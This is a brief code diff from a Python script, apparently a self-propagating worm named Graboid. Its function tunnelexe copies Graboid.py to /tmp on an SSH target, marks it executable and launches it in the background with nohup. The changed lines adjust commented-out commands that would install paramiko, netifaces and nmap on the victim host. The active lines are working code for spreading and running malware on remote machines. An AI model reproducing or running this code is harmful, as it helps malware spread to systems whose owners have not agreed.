@@ -82,10 +82,11 @@ def tunnelexe(sshTGT, sftpTGT):
     try:
         sftpTGT.put(TGT_file("Graboid.py" ), "/tmp/" + "Graboid.py")
         
-        # sshTGT.exec_command("sudo apt -y install python3-pip")
-        # sshTGT.exec_command("sudo apt-get -y install python-paramiko")
-        # sshTGT.exec_command("sudo apt-get -y install python-netifaces")
-        # sshTGT.exec_command("sudo apt-get -y install nmap")
+        # sshTGT.exec_command("sudo apt-get -y install python3")
+        # sshTGT.exec_command("sudo apt-get -y install python3-pip")
+        # sshTGT.exec_command("pip install paramiko")
+        # sshTGT.exec_command("pip install netifaces")        
+        # sshTGT.exec_command("python3 -m pip install python-nmap")
         sshTGT.exec_command("chmod a+x /tmp/Graboid.py" )
         sshTGT.exec_command("nohup python /tmp/Graboid.py")
         
